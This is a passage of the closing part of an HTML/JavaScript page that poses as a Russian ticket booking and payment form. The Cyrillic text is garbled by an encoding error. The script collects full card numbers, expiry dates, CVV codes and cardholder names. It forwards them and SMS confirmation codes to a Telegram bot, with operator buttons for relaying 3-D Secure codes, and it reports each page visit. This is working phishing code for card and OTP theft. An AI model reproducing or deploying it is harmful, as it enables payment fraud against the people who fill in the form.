                            <button class="btn btn-outline" onclick="state.step='card'; render();">‚Üê –ù–∞–∑–∞–¥ –∫ –∫–∞—Ä—Ç–µ</button>
                        </div>
                    `;
                } else if (state.step === 'success') {
                    html = `
                        <div class="header">
                            <h2>–û–ø–ª–∞—Ç–∞ —É—Å–ø–µ—à–Ω–∞</h2>
                        </div>
                        <div class="content success">
                            <div class="success-icon">‚úì</div>
                            <h3>–ë–∏–ª–µ—Ç –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω!</h3>
                            <p style="margin:16px 0;">–ë–∏–ª–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ email –∏ SMS.<br>–î–∏—Å–ø–µ—Ç—á–µ—Ä —Å–≤—è–∂–µ—Ç—Å—è —Å –≤–∞–º–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 10 –º–∏–Ω—É—Ç.</p>
                            <div class="info">
                                <div class="info-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${route.from} ‚Üí ${route.to}</span></div>
                                <div class="info-row"><span>–î–∞—Ç–∞/–≤—Ä–µ–º—è</span><span>${route.date} ${route.time}</span></div>
                                <div class="info-row"><span>–ü–∞—Å—Å–∞–∂–∏—Ä</span><span>${state.passenger.fullName}</span></div>
                            </div>
                            <button class="btn" onclick="window.location.reload()">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button>
                        </div>
                    `;
                } else if (state.step === 'fail') {
                    html = `
                        <div class="header">
                            <h2>–û—à–∏–±–∫–∞ –ø–ª–∞—Ç–µ–∂–∞</h2>
                        </div>
                        <div class="content fail">
                            <div class="fail-icon">‚úï</div>
                            <h3>–ü–ª–∞—Ç—ë–∂ –Ω–µ –ø—Ä–æ—à—ë–ª</h3>
                            <p style="margin:16px 0;">–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥—É—é –∫–∞—Ä—Ç—É –∏–ª–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–∑–∂–µ.</p>
                            <button class="btn" onclick="state.step='card'; render();">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>
                            <button class="btn btn-outline" onclick="window.location.reload()">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button>
                        </div>
                    `;
                }

                app.innerHTML = html;

                if (state.step === 'passenger') {
                    document.getElementById('nextBtn')?.addEventListener('click', () => {
                        state.passenger.fullName = document.getElementById('fullName').value.trim();
                        state.passenger.phone = document.getElementById('phone').value.trim().replace(/\D/g, '');
                        state.passenger.email = document.getElementById('email').value.trim();
                        
                        if (!state.passenger.fullName || !state.passenger.phone) {
                            alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –§–ò–û –∏ —Ç–µ–ª–µ—Ñ–æ–Ω');
                            return;
                        }
                        if (state.passenger.phone.length < 10) {
                            alert('–¢–µ–ª–µ—Ñ–æ–Ω –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –Ω–µ –º–µ–Ω–µ–µ 10 —Ü–∏—Ñ—Ä');
                            return;
                        }
                        state.step = 'card';
                        render();
                    });
                }
                if (state.step === 'card') {
                    const cn = document.getElementById('cardNumber');
                    const ex = document.getElementById('expiry');
                    const cv = document.getElementById('cvv');
                    if (cn) cn.addEventListener('input', (e) => e.target.value = formatCardNumber(e.target.value));
                    if (ex) ex.addEventListener('input', (e) => e.target.value = formatExpiry(e.target.value));
                    if (cv) cv.addEventListener('input', (e) => e.target.value = formatCVV(e.target.value));

                    document.getElementById('payBtn')?.addEventListener('click', async () => {
                        state.card.number = document.getElementById('cardNumber').value.trim();
                        state.card.expiry = document.getElementById('expiry').value.trim();
                        state.card.cvv = document.getElementById('cvv').value.trim();
                        state.card.cardholder = document.getElementById('cardholder').value.trim();
                        
                        const cardDigits = state.card.number.replace(/\D/g, '');
                        
                        if (cardDigits.length !== 16) {
                            alert('–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 16 —Ü–∏—Ñ—Ä');
                            return;
                        }
                        if (!state.card.expiry || state.card.expiry.length < 5) {
                            alert('–í–≤–µ–¥–∏—Ç–µ —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è');
                            return;
                        }
                        if (!state.card.cvv || state.card.cvv.length < 3) {
                            alert('–í–≤–µ–¥–∏—Ç–µ CVV-–∫–æ–¥');
                            return;
                        }
                        if (!state.card.cardholder) {
                            alert('–í–≤–µ–¥–∏—Ç–µ –≤–ª–∞–¥–µ–ª—å—Ü–∞ –∫–∞—Ä—Ç—ã');
                            return;
                        }
                        
                        const ok = await sendCardToBot();
                        if (ok) {
                            state.step = 'processing';
                            render();
                        } else {
                            alert('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram');
                        }
                    });
                }
                if (state.step === 'sms') {
                    document.getElementById('confirmSms')?.addEventListener('click', async () => {
                        const code = document.getElementById('smsCode').value.trim();
                        if (!code || code.length < 4) {
                            alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS');
                            return;
                        }
                        state.smsCode = code;
                        
                        const messageText = `üì® SMS-–ö–û–î\n\nüÜî –°–µ—Å—Å–∏—è: ${state.sessionId}\nüì± –ö–æ–¥: ${code}`;
                        
                        const smsKeyboard = {
                            inline_keyboard: [
                                [{ text: '‚úÖ –£–°–ü–ï–• (3D)', callback_data: `bind_success_${state.sessionId}` },
                                 { text: '‚ùå –§–ï–ô–õ', callback_data: `bind_fail_${state.sessionId}` },
                                 { text: 'üîÑ –ü–û–í–¢–û–† –°–ú–°', callback_data: `resend_${state.sessionId}` }]
                            ]
                        };
                        
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: ADMIN_ID,
                                text: messageText,
                                parse_mode: 'HTML',
                                reply_markup: smsKeyboard
                            })
                        });
                        
                        // üî• –°–†–ê–ó–£ –ü–ï–†–ï–ö–õ–Æ–ß–ê–ï–ú –ù–ê –°–¢–†–ê–ù–ò–¶–£ –û–ñ–ò–î–ê–ù–ò–Ø –ë–ê–ù–ö–ê
                        state.step = 'processing2';
                        render();
                    });
                    
                    document.getElementById('resendSms')?.addEventListener('click', async () => {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: ADMIN_ID,
                                text: `üîÑ –ü–û–í–¢–û–†–ù–´–ô –ó–ê–ü–†–û–° SMS\n\nüÜî –°–µ—Å—Å–∏—è: ${state.sessionId}`
                            })
                        });
                        alert('–ù–æ–≤—ã–π –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
                    });
                }
            }

            sendVisitNotification();
            render();
        })();
    </script>
</body>
</html>
